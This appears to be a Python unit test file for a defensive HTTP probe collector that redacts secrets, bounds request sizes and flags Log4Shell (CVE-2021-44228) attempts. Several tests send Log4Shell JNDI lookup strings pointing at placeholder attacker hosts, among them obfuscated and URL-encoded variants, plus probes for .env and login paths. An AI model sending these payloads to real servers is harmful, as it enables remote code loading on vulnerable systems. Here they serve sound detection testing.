import dataclasses
import datetime as dt
import http.client
import json
import socket
import tempfile
import threading
import time
import unittest
from pathlib import Path

from collector import CollectorConfig, create_server, prune_temp_jsonl
from signatures import InspectionInput, SignatureRule, inspect_http_request


class HttpCollectorSecurityTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmpdir = tempfile.TemporaryDirectory()
        self.output_path = Path(self.tmpdir.name) / "events.jsonl"
        self.config = CollectorConfig(
            host="127.0.0.1",
            port=0,  # ephemeral localhost port
            protocol_label="http",
            reported_dst_port=80,
            output_jsonl=self.output_path,
            max_body_bytes=64,
            max_path_length=128,
        )
        self.server = create_server(self.config)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def tearDown(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)
        self.tmpdir.cleanup()

    def _read_records(self) -> list[dict]:
        lines = self.output_path.read_text(encoding="utf-8").strip().splitlines()
        return [json.loads(line) for line in lines]

    def test_strips_sensitive_headers_and_redacts_query_secrets(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/wp-login.php?user=admin&password=secret123&token=tok999",
            headers={
                "User-Agent": "SyntheticScanner/1.0",
                "Authorization": "Bearer DO_NOT_STORE",
                "Cookie": "session=DO_NOT_STORE",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        rec = records[0]
        self.assertEqual(rec["event_type"], "http_cms_probe")
        self.assertEqual(
            rec["http_path"],
            "/wp-login.php?user=admin&password=[REDACTED]&token=[REDACTED]",
        )
        headers = rec["metadata"]["headers"]
        self.assertEqual(headers.get("user-agent"), "SyntheticScanner/1.0")
        self.assertNotIn("authorization", headers)
        self.assertNotIn("cookie", headers)

    def test_truncates_oversize_body_without_unbounded_buffering(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        oversize_payload = b"A" * 500
        conn.request("POST", "/cgi-bin/luci/test", body=oversize_payload)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        meta = records[0]["metadata"]
        self.assertEqual(records[0]["event_type"], "http_router_probe")
        self.assertTrue(meta["body_truncated"])
        self.assertEqual(meta["sampled_body_bytes"], 64)
        self.assertEqual(meta["declared_content_length"], 500)
        self.assertIsNotNone(meta["body_sha256"])

    def test_bounds_long_paths_and_records_hostile_strings_inertly(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        long_path = "/.env?q=" + ("x" * 300)
        conn.request("GET", long_path)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertLessEqual(len(records[0]["http_path"]), 128)
        self.assertEqual(records[0]["event_type"], "http_secret_file_probe")

    def test_redacts_secrets_in_referer_query_string(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/login",
            headers={
                "Referer": "https://example.invalid/auth?session=SECRET_SESS&next=/home",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertEqual(
            records[0]["metadata"]["headers"].get("referer"),
            "https://example.invalid/auth?session=[REDACTED]&next=/home",
        )

    def test_prunes_jsonl_records_older_than_24h(self) -> None:
        now = dt.datetime(2026, 11, 21, tzinfo=dt.timezone.utc)
        old = (now - dt.timedelta(hours=25)).isoformat().replace("+00:00", "Z")
        fresh = now.isoformat().replace("+00:00", "Z")
        self.output_path.write_text(
            json.dumps({"observed_at": old, "src_ip": "192.0.2.1"})
            + "\n"
            + json.dumps({"observed_at": fresh, "src_ip": "192.0.2.2"})
            + "\n",
            encoding="utf-8",
        )
        prune_temp_jsonl(self.output_path, now=now)
        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["src_ip"], "192.0.2.2")

    def test_rejects_requests_when_concurrency_cap_is_exhausted(self) -> None:
        # Exhaust all permits in the server semaphore to deterministically test 503 shedding
        permits = self.config.max_concurrent_connections
        for _ in range(permits):
            self.assertTrue(self.server.connection_semaphore.acquire(blocking=False))
        try:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", "/overload-check")
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 503)
            conn.close()
            self.assertEqual(self.server.rejected_overload, 1)
        finally:
            for _ in range(permits):
                self.server.connection_semaphore.release()

    def test_slow_headers_time_out_without_blocking_the_next_request(self) -> None:
        self.server.config = dataclasses.replace(
            self.server.config, socket_timeout_seconds=0.4
        )
        sock = socket.create_connection(("127.0.0.1", self.port), timeout=2)
        sock.sendall(b"GET /slow HTTP/1.1\r\nHost: 127.0.0.1\r\n")
        time.sleep(0.8)
        sock.close()

        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request("GET", "/still-up")
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()
        paths = [rec["http_path"] for rec in self._read_records()]
        self.assertIn("/still-up", paths)

    def test_drops_oversized_headers_without_storing_them(self) -> None:
        self.server.config = dataclasses.replace(self.server.config, max_header_bytes=128)
        sock = socket.create_connection(("127.0.0.1", self.port), timeout=2)
        sock.sendall(b"GET / HTTP/1.1\r\nUser-Agent: " + (b"A" * 4000) + b"\r\n\r\n")
        sock.settimeout(2)
        raw_response = b""
        try:
            raw_response = sock.recv(256)
        except OSError:
            pass
        sock.close()

        self.assertIn(b"431", raw_response)
        stored = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("A" * 64, stored)
        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertTrue(records[0]["metadata"].get("header_rejected"))

        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request("GET", "/after-header-limit")
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()
        self.assertEqual(len(self._read_records()), 2)

    def test_detects_log4shell_in_user_agent_without_storing_attacker_url(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/",
            headers={
                "User-Agent": "${jndi:ldap://attacker.invalid:1389/Exploit}",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("attacker.invalid", raw_jsonl)
        self.assertNotIn("1389/Exploit", raw_jsonl)

        records = self._read_records()
        self.assertEqual(len(records), 1)
        rec = records[0]
        self.assertEqual(rec["attack_category"], "suspected_cve_probe")
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        det = detections[0]
        self.assertEqual(det["signature_id"], "http-log4shell-jndi-lookup")
        self.assertEqual(det["rule_version"], "1.0.0")
        self.assertEqual(det["candidate_cve"], "CVE-2021-44228")
        self.assertEqual(det["matched_location"], "header:user-agent")
        self.assertEqual(det["classification"], "candidate_cve")
        self.assertGreaterEqual(det["confidence"], 0.8)
        self.assertIn("Suspected CVE-2021-44228", det["summary"])
        self.assertIn("not confirmed exploitation", det["summary"])

    def test_detects_log4shell_in_url_including_url_encoding(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.invalid%2Fa%7D",
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("evil.invalid", raw_jsonl)

        rec = self._read_records()[0]
        self.assertEqual(rec["attack_category"], "suspected_cve_probe")
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        self.assertEqual(detections[0]["matched_location"], "url")
        self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")

    def test_detects_log4shell_in_body_and_discards_raw_payload(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        payload = b'{"msg":"${jndi:rmi://body-evil.invalid/a}"}'
        conn.request(
            "POST",
            "/api/login",
            body=payload,
            headers={"Content-Type": "application/json"},
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("body-evil.invalid", raw_jsonl)
        self.assertNotIn("${jndi:", raw_jsonl)

        rec = self._read_records()[0]
        self.assertEqual(rec["event_type"], "http_payload_probe")
        self.assertEqual(rec["attack_category"], "suspected_cve_probe")
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        self.assertEqual(detections[0]["matched_location"], "body")
        self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")
        self.assertIsNotNone(rec["metadata"]["body_sha256"])

    def test_detects_obfuscated_log4shell_patterns_and_non_allowlisted_headers(self) -> None:
        cases = [
            (
                "X-Api-Version",
                "${${lower:j}ndi:${::-l}${::-d}ap://obf1.invalid/a}",
                "header:x-api-version",
            ),
            (
                "X-Forwarded-For",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-r}mi://obf2.invalid/a}",
                "header:x-forwarded-for",
            ),
            (
                "User-Agent",
                "%2524%257B%2524%257Bupper%253Aj%257Dndi%253Adns%253A%252F%252Fobf3.invalid%252Fa%257D",
                "header:user-agent",
            ),
        ]
        for header_name, header_val, expected_loc in cases:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", "/probe", headers={header_name: header_val})
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 404)
            conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        for forbidden in ("obf1.invalid", "obf2.invalid", "obf3.invalid"):
            self.assertNotIn(forbidden, raw_jsonl)

        records = self._read_records()
        self.assertEqual(len(records), len(cases))
        for rec, (_, _, expected_loc) in zip(records, cases):
            self.assertEqual(rec["attack_category"], "suspected_cve_probe")
            detections = rec["metadata"]["signature_detections"]
            self.assertEqual(len(detections), 1)
            self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")
            self.assertEqual(detections[0]["matched_location"], expected_loc)

    def test_normal_http_request_produces_no_signature_detections(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "POST",
            "/index.html?page=2",
            body=b"hello=world&note=normal-request",
            headers={"User-Agent": "Mozilla/5.0 (compatible; BenignCheck/1.0)"},
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        rec = self._read_records()[0]
        self.assertNotIn("signature_detections", rec["metadata"])
        self.assertNotIn("attack_category", rec)

    def test_oversize_body_truncates_inspection_at_max_body_bytes(self) -> None:
        # max_body_bytes is 64 in setUp; payload placed after byte 80 must not be buffered/inspected
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        payload_after_cap = (b"A" * 80) + b"${jndi:ldap://late.invalid/a}"
        conn.request("POST", "/upload", body=payload_after_cap)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        # Payload inside the first 64 bytes is detected while the rest is truncated
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        payload_within_cap = b"${jndi:ldap://early.invalid/a}" + (b"B" * 200)
        conn.request("POST", "/upload", body=payload_within_cap)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("late.invalid", raw_jsonl)
        self.assertNotIn("early.invalid", raw_jsonl)

        records = self._read_records()
        self.assertEqual(len(records), 2)
        self.assertTrue(records[0]["metadata"]["body_truncated"])
        self.assertNotIn("signature_detections", records[0]["metadata"])

        self.assertTrue(records[1]["metadata"]["body_truncated"])
        self.assertEqual(records[1]["attack_category"], "suspected_cve_probe")
        self.assertEqual(
            records[1]["metadata"]["signature_detections"][0]["matched_location"],
            "body",
        )

    def test_sensitive_header_match_redacts_location_and_leaks_no_secrets(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/auth?password=TOPSECRET_PASS&token=TOPSECRET_TOK",
            headers={
                "Authorization": "Bearer SECRET_JWT ${jndi:ldap://secret-cb.invalid/x}",
                "Cookie": "session=SECRET_COOKIE",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        for secret in (
            "TOPSECRET_PASS",
            "TOPSECRET_TOK",
            "SECRET_JWT",
            "SECRET_COOKIE",
            "secret-cb.invalid",
        ):
            self.assertNotIn(secret, raw_jsonl)

        rec = self._read_records()[0]
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        self.assertEqual(detections[0]["matched_location"], "header:redacted")
        self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")

    def test_supports_multiple_rules_and_multiple_cves_without_collector_changes(self) -> None:
        extra_rules = (
            SignatureRule(
                signature_id="http-example-cve-a",
                rule_version="1.0.0",
                candidate_cve="CVE-2024-0001",
                classification="candidate_cve",
                match_text=lambda text: (0.8, "Suspected CVE-2024-0001 probe")
                if "marker-a" in text
                else None,
            ),
            SignatureRule(
                signature_id="http-example-cve-b",
                rule_version="1.0.0",
                candidate_cve="CVE-2024-0002",
                classification="candidate_cve",
                match_text=lambda text: (0.7, "Suspected CVE-2024-0002 probe")
                if "marker-a" in text
                else None,
            ),
        )
        matches = inspect_http_request(
            InspectionInput(
                method="GET",
                raw_path="/test?x=marker-a",
                headers=(),
                body_bytes=b"",
            ),
            rules=extra_rules,
        )
        self.assertEqual(
            [m.candidate_cve for m in matches],
            ["CVE-2024-0001", "CVE-2024-0002"],
        )


if __name__ == "__main__":
    unittest.main()
